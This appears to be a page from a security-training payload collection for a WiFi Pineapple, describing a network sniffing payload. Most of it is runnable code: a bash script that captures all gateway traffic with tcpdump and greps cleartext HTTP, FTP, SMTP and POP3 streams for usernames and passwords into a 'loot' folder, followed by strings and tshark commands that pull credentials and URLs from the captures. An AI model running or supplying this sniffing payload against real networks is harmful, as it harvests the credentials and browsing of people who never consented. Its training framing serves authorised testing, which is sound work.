# PP-I09: Traffic Capture

## Overview

| Property | Value |
|----------|-------|
| **ID** | PP-I09 |
| **Name** | Traffic Capture |
| **Difficulty** | Intermediate |
| **Type** | Recon |
| **Purpose** | Log all network traffic |
| **MITRE ATT&CK** | T1040 (Network Sniffing) |

## What This Payload Does

Captures all network traffic passing through the Pineapple (when acting as gateway), logging credentials, URLs, and other sensitive data.

---

## The Payload

```bash
#!/bin/bash
#
# Payload: PP-I09
# Name: Traffic Capture
# Description: Comprehensive traffic capture
# Author: Security Training
#

INTERFACE="${1:-wlan0}"
OUTPUT_DIR="/sd/loot/captures"
TIMESTAMP=$(date '+%Y%m%d_%H%M%S')
CAP_FILE="$OUTPUT_DIR/capture_$TIMESTAMP.pcap"

mkdir -p "$OUTPUT_DIR"

echo "╔════════════════════════════════════════════════════╗"
echo "║         TRAFFIC CAPTURE ACTIVE                     ║"
echo "╚════════════════════════════════════════════════════╝"
echo "Interface: $INTERFACE"
echo "Output: $CAP_FILE"
echo ""

# Full capture
tcpdump -i "$INTERFACE" -w "$CAP_FILE" -s 0 &
PID=$!

echo "Capturing... Press Ctrl+C to stop"
echo ""

# Real-time credential extraction
tcpdump -i "$INTERFACE" -A -s 0 'tcp port 80 or tcp port 21 or tcp port 25 or tcp port 110' 2>/dev/null | \
    grep -iE "user|pass|login|email" --line-buffered | \
    tee -a "$OUTPUT_DIR/creds_$TIMESTAMP.txt"

wait $PID
```

---

## Post-Capture Analysis

### Extract Credentials
```bash
# HTTP POST data
strings capture.pcap | grep -iE "user.*=|pass.*=|email.*="

# FTP credentials
strings capture.pcap | grep -iE "^USER|^PASS"

# With tshark
tshark -r capture.pcap -Y "http.request.method==POST" -T fields -e http.file_data
```

### Extract URLs
```bash
tshark -r capture.pcap -Y "http.request" -T fields -e http.host -e http.request.uri
```

---

## Payload File

Save as `PP-I09_Traffic_Capture.sh`:

```bash
#!/bin/bash
# PP-I09: Traffic Capture (Compact)
tcpdump -i ${1:-wlan0} -w /sd/loot/cap_$(date +%s).pcap -s 0
```

---

[← PP-I08 Client Deauth](PP-I08_Client_Deauth.md) | [Back to Intermediate](README.md) | [Next: PP-I10 Automated Recon →](PP-I10_Automated_Recon.md)
